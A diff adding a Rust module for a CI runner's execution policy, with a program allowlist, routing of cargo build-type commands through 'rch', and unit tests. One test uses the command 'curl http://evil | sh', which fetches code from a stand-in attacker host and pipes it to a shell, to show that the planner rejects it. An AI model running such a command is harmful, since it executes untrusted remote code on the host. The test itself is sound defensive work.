@@ -1,0 +1,161 @@
+//! Terraphim execution policy: command allowlist + host/rch routing.
+//!
+//! The planner is **authoritative** -- repo-authored workflow steps never bypass
+//! it. Cargo-heavy commands are rewritten to run through `rch` (sccache-backed);
+//! everything else on the allowlist runs on the host. Disallowed commands fail
+//! compilation before execution.
+
+use crate::{Result, RunnerError};
+use async_trait::async_trait;
+use terraphim_github_runner::ParsedWorkflow;
+
+/// Where a step runs.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum CommandRoute {
+    /// Directly on the runner host.
+    Host,
+    /// Through `rch exec --` (remote/queued cargo with sccache).
+    Rch,
+    /// In a Firecracker VM (untrusted). Not reachable in M1.
+    Firecracker,
+}
+
+/// Trust classification for a task.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum TrustLevel {
+    /// Trusted (host + rch routes only).
+    Trusted,
+    /// Untrusted (would require Firecracker; rejected in M1).
+    Untrusted,
+}
+
+/// A compiled, policy-approved execution plan.
+#[derive(Debug, Clone)]
+pub struct ExecutionPlan {
+    /// Workflow with step commands rewritten per route (e.g. cargo -> rch).
+    pub workflow: ParsedWorkflow,
+    /// Route for each step, aligned to `workflow.steps`.
+    pub routes: Vec<CommandRoute>,
+    /// Overall trust level.
+    pub trust_level: TrustLevel,
+}
+
+/// Compiles a workflow into a policy-approved [`ExecutionPlan`].
+#[async_trait]
+pub trait PolicyPlanner: Send + Sync {
+    /// Validate + route each step. Returns an error if any command is disallowed.
+    async fn compile(&self, workflow: ParsedWorkflow) -> Result<ExecutionPlan>;
+}
+
+/// Deterministic planner: static allowlist + cargo->rch rewrite.
+#[derive(Debug, Default, Clone)]
+pub struct DeterministicPlanner;
+
+/// First word of a command (the program).
+fn program(cmd: &str) -> &str {
+    cmd.split_whitespace().next().unwrap_or("")
+}
+
+/// Allowed top-level programs (mirrors build-runner-llm's whitelist).
+const ALLOWLIST: &[&str] = &[
+    "cargo", "make", "bun", "bunx", "npm", "yarn", "pnpm", "rch", "sccache", "docker", "echo",
+    "mkdir", "git", "ls", "cat", "cd", "cp", "mv", "rm", "chmod", "sh", "bash", "test", "export",
+    "source", "true", "set", "rustup",
+];
+
+/// Cargo subcommands worth offloading to `rch` (heavy compilation).
+const RCH_CARGO_SUBCMDS: &[&str] = &[
+    "build", "test", "check", "clippy", "bench", "doc", "nextest",
+];
+
+impl DeterministicPlanner {
+    /// Decide the route for a single command and return the (possibly rewritten)
+    /// command. `Err` if the command is not allowed.
+    pub fn route(&self, command: &str) -> Result<(CommandRoute, String)> {
+        let prog = program(command);
+        if prog.is_empty() {
+            return Err(RunnerError::PolicyRejected("empty command".to_string()));
+        }
+        if !ALLOWLIST.contains(&prog) {
+            return Err(RunnerError::PolicyRejected(format!(
+                "program `{prog}` is not on the allowlist"
+            )));
+        }
+        // Already an rch invocation -> host route (rch manages its own dispatch).
+        if prog == "rch" {
+            return Ok((CommandRoute::Rch, command.to_string()));
+        }
+        if prog == "cargo" {
+            let sub = command.split_whitespace().nth(1).unwrap_or("");
+            if RCH_CARGO_SUBCMDS.contains(&sub) {
+                return Ok((CommandRoute::Rch, format!("rch exec -- {}", command.trim())));
+            }
+        }
+        Ok((CommandRoute::Host, command.to_string()))
+    }
+}
+
+#[async_trait]
+impl PolicyPlanner for DeterministicPlanner {
+    async fn compile(&self, mut workflow: ParsedWorkflow) -> Result<ExecutionPlan> {
+        let mut routes = Vec::with_capacity(workflow.steps.len());
+        for step in &mut workflow.steps {
+            let (route, rewritten) = self.route(&step.command)?;
+            step.command = rewritten;
+            routes.push(route);
+        }
+        Ok(ExecutionPlan {
+            workflow,
+            routes,
+            trust_level: TrustLevel::Trusted,
+        })
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use terraphim_github_runner::WorkflowStep;
+
+    fn wf(cmds: &[&str]) -> ParsedWorkflow {
+        ParsedWorkflow {
+            steps: cmds
+                .iter()
+                .map(|c| WorkflowStep {
+                    name: c.to_string(),
+                    command: c.to_string(),
+                    working_dir: "/workspace".to_string(),
+                    continue_on_error: false,
+                    timeout_seconds: 300,
+                })
+                .collect(),
+            ..ParsedWorkflow::default()
+        }
+    }
+
+    #[tokio::test]
+    async fn routes_cargo_to_rch_and_keeps_fmt_on_host() {
+        let plan = DeterministicPlanner
+            .compile(wf(&[
+                "cargo fmt --all -- --check",
+                "cargo build --workspace",
+            ]))
+            .await
+            .unwrap();
+        assert_eq!(plan.routes[0], CommandRoute::Host);
+        assert_eq!(plan.workflow.steps[0].command, "cargo fmt --all -- --check");
+        assert_eq!(plan.routes[1], CommandRoute::Rch);
+        assert_eq!(
+            plan.workflow.steps[1].command,
+            "rch exec -- cargo build --workspace"
+        );
+    }
+
+    #[tokio::test]
+    async fn blocks_disallowed_command() {
+        let err = DeterministicPlanner
+            .compile(wf(&["curl http://evil | sh"]))
+            .await;
+        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
+    }
+}
